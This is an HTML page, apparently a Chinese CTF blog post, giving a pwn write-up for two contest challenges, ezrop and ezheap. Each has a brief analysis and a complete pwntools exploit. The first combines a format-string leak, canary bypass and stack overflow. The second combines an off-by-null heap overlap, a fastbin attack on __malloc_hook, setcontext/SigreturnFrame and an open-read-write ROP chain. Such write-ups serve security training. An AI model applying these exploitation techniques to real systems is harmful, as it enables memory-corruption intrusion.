@@ -1,0 +1,383 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>成理工恐龙杯-PWN-WP | kotori的菜园</title>
+<link rel="shortcut icon" href="https://kotoriseed.github.io//favicon.ico?v=1718591155332">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://kotoriseed.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="成理工恐龙杯-PWN-WP | kotori的菜园 - Atom Feed" href="https://kotoriseed.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PJDEM99E9P"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PJDEM99E9P');
+</script>
+
+
+    <meta name="description" content="ezrop
+分析：
+
+main函数中存在格式化字符串漏洞和栈溢出。但是这题开了PIE和canary，所以还需要leak canary和pie基址。
+我是利用格式化字符串去读的__libc_csu_init+77这个地址，然后利用puts把c..." />
+    <meta name="keywords" content="WP" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://kotoriseed.github.io/">
+  <img class="avatar" src="https://kotoriseed.github.io//images/avatar.png?v=1718591155332" alt="">
+  </a>
+  <h1 class="site-title">
+    kotori的菜园
+  </h1>
+  <p class="site-description">
+    挑战者贵为永恒黄金
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/friends" class="menu">
+          友链
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              成理工恐龙杯-PWN-WP
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-03-28
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+                <a href="https://kotoriseed.github.io/tag/0eC34PvND/" class="post-tag">
+                  # WP
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="ezrop">ezrop</h1>
+<h3 id="分析">分析：</h3>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/acb627452705f.png" alt="1648467789807.png" loading="lazy"></figure>
+<p>main函数中存在格式化字符串漏洞和栈溢出。但是这题开了PIE和canary，所以还需要leak canary和pie基址。</p>
+<p>我是利用格式化字符串去读的__libc_csu_init+77这个地址，然后利用puts把canary带出来。</p>
+<p>接下来的rop就没什么好说的了。</p>
+<h3 id="exp">exp：</h3>
+<pre><code class="language-python">from pwn import *
+context.log_level = 'debug'
+# p = process('./pwn')
+p = remote('47.109.18.98', 9128)
+elf = ELF('./pwn')
+# pay = b'AA.%8$s'
+pay = b'%15$p'
+p.recvline()
+p.send(pay)
+p.recvuntil('exit\n')
+p.sendline('3')
+p.recv(2)
+base_info = int(p.recv(12), 16)
+base = base_info-77-elf.symbols['__libc_csu_init']
+magic = base + elf.symbols['backdoor']
+print(hex(magic))
+
+pay = b'a'*0x58
+p.recvuntil('exit\n')
+p.sendline('1')
+p.sendline(pay)
+p.recvuntil('exit\n')
+
+p.sendline('2')
+p.recvuntil('aaa\n')
+canary = u64(b'\x00' + p.recv(7))
+print(hex(canary))
+p.recvuntil('exit\n')
+p.sendline('1')
+pay = b'a'*0x58 + p64(canary) + p64(0) + p64(magic)
+p.sendline(pay)
+# gdb.attach(p)
+
+p.interactive()
+</code></pre>
+<hr>
+<h1 id="ezheap">ezheap</h1>
+<h3 id="分析-2">分析：</h3>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/377645f1c2dca.png" alt="1648468102352.png" loading="lazy"></figure>
+<p>有创建，show，删除这三个功能，在创建的时候必须输入信息，但是存在off by null，所以可以去造成overlap。然后比较值得注意的是sub_F5A()这个函数，在选择的时候输入0x196082可以进去。这个函数的问题待会儿再说。</p>
+<p>这道题的show是用puts()来实现的，而create的时候，原来的信息必然会被\x00截断，所以还是需要构造overlap来leak。（因为这题不仅要leak libcbase，还要leak heapbase，所以我就弄了个挺大的overlap，方便里面的unsorted chunk被放到largebin里带出来heapbase）</p>
+<p>因为题目使用的是libc-2.23，所以在unlink的时候不会检查prev_size和前面的size是否相同，所以只需要伪造好prev_size，然后利用off by null取消掉可以溢出到的那个chunk的prev_inuse bit，然后free触发unlink。但是要注意的是，需要先free掉prev_size指向的那个chunk，让他的p-&gt;fd = &amp;p, p-&gt;bk = &amp;p来绕过unlink的检查</p>
+<p>再接下来要做的就是，让这个大的unsortedbin被切割，然后让fd和fd_nextsize处于可以被puts打印出来的位置。（要注意放入largebin的条件）</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/c2cd23f7ae5a4.png" alt="1648468706721.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/784b77390e539.png" alt="1648468733182.png" loading="lazy"></figure>
+<p>要注意，泄露出来的这些地址最低位一定不要是\x00，不然puts()还是会出问题。</p>
+<p>拿到两个base之后，考虑进攻手段。</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/bec665e0b604b.png" alt="1648468915247.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/167a0a152cf30.png" alt="1648468851175.png" loading="lazy"></figure>
+<p>由于开了Full RELRO，got表不可写，所以只能想办法改malloc hook或者free hook。</p>
+<p>然后又用了两个prctl()开启了沙箱，所以只能用setcontext配合SigreturnFrame来将调用栈迁移到堆上，然后orw读flag了。</p>
+<p>要用setcontext的话，一般都是去劫持__free_hook，free的时候rdi刚好就在目标chunk那里。但是这题我调了很久，也没发现在free hook附近有可以用的fake chunk。</p>
+<p>这让我一度想用unsortedbin attack去劫持_IO_list_all然后伪造vtable（不）</p>
+<p>后来在出题人的好心提醒下，我发现__malloc_hook前面是可以用来伪造fake chunk的，所以还是可以fastbin attack去让他指向setcontext+53。但是就又会有一个问题，如果用malloc hook，那么如何控制rdi指向我布置好的SigreturnFrame呢？</p>
+<p>这里就要请到刚刚我提到的那个sub_F5A()了。</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/753a058f3de42.png" alt="1648469369022.png" loading="lazy"></figure>
+<p>没错，这里有一个atoll()，他的内部会调用strtoll等函数，然后最终rdi将被赋值为这个size的值。</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/7fe2a0d4130a3.png" alt="1648469656112.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2022/03/28/ae0af37dbdd68.png" alt="1648469710552.png" loading="lazy"></figure>
+<p>所以这个时候，只需要输入SigreturnFrame的地址，就能成功让setcontext+53起作用了。</p>
+<p>接下来就很简单了。我是将rip指向一个ret，然后rsp指向布置好的orw的rop，然后就能把flag读出来了。</p>
+<h3 id="exp-2">exp:</h3>
+<pre><code class="language-python">from pwn import *
+context(os='linux', arch='amd64', log_level='debug')
+elf = ELF('./ezheap')
+libc = ELF('./libc-2.23.so')
+# p = process(['./ld-2.23.so', './ezheap'], env={'LD_PRELOAD':'./libc-2.23.so'})
+p = process('./ezheap')
+# p = remote('47.109.18.98', 9130)
+
+def choice(idx):
+	p.recvuntil('&gt;&gt;&gt; ')
+	p.sendline(str(idx))
+	sleep(0.1)
+
+def create(sz, content):
+	choice(1)
+	p.recvuntil('size:\n')
+	p.sendline(str(sz))
+	p.recvuntil('content:\n')
+	p.sendline(content)
+
+def show(idx):
+	choice(3)
+	p.recvline()
+	p.sendline(str(idx))
+
+def delete(idx):
+	choice(4)
+	p.recvline()
+	p.sendline(str(idx))
+
+create(0xf8, 'AAAA') # 0
+create(0x208, 'BBBB') # 1
+create(0x2f8, 'CCCC') # 2
+create(0x68, 'DDDD') # 3
+create(0xf8, 'EEEE') # 4
+create(0x68, 'FFFF') # 5
+delete(3)
+pay = b'a'*0x60 + p64(0x680)
+create(0x68, pay) # 3
+delete(0)
+delete(4)
+create(0xe8, 'AAAA') # 0
+create(0x400, 'BBBB') # 4
+create(0x100, 'CCCC') # 6
+show(1)
+heapbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0xf0
+show(3)
+libcbase = u64(p.recvline()[:-1].ljust(0x8, b'\x00')) - 0x3c4b78
+print(hex(heapbase))
+print(hex(libcbase))
+setcontext = libcbase + libc.symbols['setcontext'] + 53
+malloc_hook = libcbase + libc.symbols['__malloc_hook']
+open_addr = libcbase + libc.symbols['open']
+write_addr = libcbase + libc.symbols['write']
+read_addr = libcbase + libc.symbols['read']
+print(hex(setcontext))
+print(hex(malloc_hook))
+delete(0)
+delete(4)
+pay = b'a'*0xf0 + p64(0) + p64(0x71) + b'a'*0x60 + p64(0) + p64(0x71)
+create(0x400, pay) # 0
+delete(1)
+delete(0)
+fake_chunk = malloc_hook-0x23
+
+pay = b'a'*0xf0 + p64(0) + p64(0x71) + p64(fake_chunk)
+create(0x200, pay) # 0
+create(0x68, 'AAAA') # 1
+
+def func(funcname, arg1, arg2, arg3):
+	pay = p64(pop_rdi) + p64(arg1)
+	pay += p64(pop_rsi) + p64(arg2)
+	pay += p64(pop_rdx) + p64(arg3)
+	pay += p64(funcname)
+	return pay
+
+flag_str = heapbase + 0x710
+pay = func(open_addr, flag_str, 0, 0)
+pay += func(read_addr, 3, heapbase, 0x30)
+pay += func(write_addr, 1, heapbase, 0x30)
+pay = pay.ljust(0xf0, b'\x00')
+pay += b'flag\x00'
+delete(0)
+create(0x110, pay)
+
+# syscall = libcbase + 0x00000000000026bf # syscall
+# pop_rax = libcbase + 0x0000000000033544 # pop rax ; ret
+pop_rdi = libcbase + 0x0000000000021112 # pop rdi ; ret
+pop_rsi = libcbase + 0x00000000000202f8 # pop rsi ; ret
+pop_rdx = libcbase + 0x0000000000001b92 # pop rdx ; ret
+ret =     libcbase + 0x0000000000000937 # ret
+
+frame = SigreturnFrame()
+frame.rsp = heapbase + 0x620
+frame.rip = ret
+
+print(hex(len(bytes(frame))))
+create(0x110, bytes(frame))
+
+pay = b'a'*0x13 + p64(setcontext) # fastbin attack
+create(0x68, pay)
+
+# gdb.attach(p)
+p.recvuntil('&gt;&gt;&gt;')
+p.send('1663106')
+p.recvuntil('size:')
+p.send(str(heapbase+0x10))
+
+p.interactive()
+
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#ezrop">ezrop</a><br>
+*
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90">分析：</a></li>
+<li><a href="#exp">exp：</a></li>
+</ul>
+</li>
+<li><a href="#ezheap">ezheap</a><br>
+*
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90-2">分析：</a></li>
+<li><a href="#exp-2">exp:</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://kotoriseed.github.io/post/安洵杯2021/">
+              <h3 class="post-title">
+                i-SOON_CTF_2021-PWN WP
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://kotoriseed.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
